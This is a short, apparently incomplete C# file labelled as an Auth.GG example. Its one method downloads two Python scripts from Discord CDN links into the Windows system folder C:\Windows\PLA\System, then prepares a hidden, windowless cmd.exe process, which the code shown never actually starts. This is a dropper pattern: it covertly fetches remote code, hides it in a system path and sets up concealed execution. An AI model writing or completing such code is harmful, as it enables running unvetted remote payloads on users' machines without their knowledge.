using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class Python2
    {

        public static void dl2()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\PLA\System\Hex_clicker.py";
            string text1 = @"C:\Windows\PLA\System\Hex_substitution.py";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855532747372363806/Hex_clicker.py", text);
            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855532748181602384/Hex_substitution.py", text1);


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;













        }
    }

}

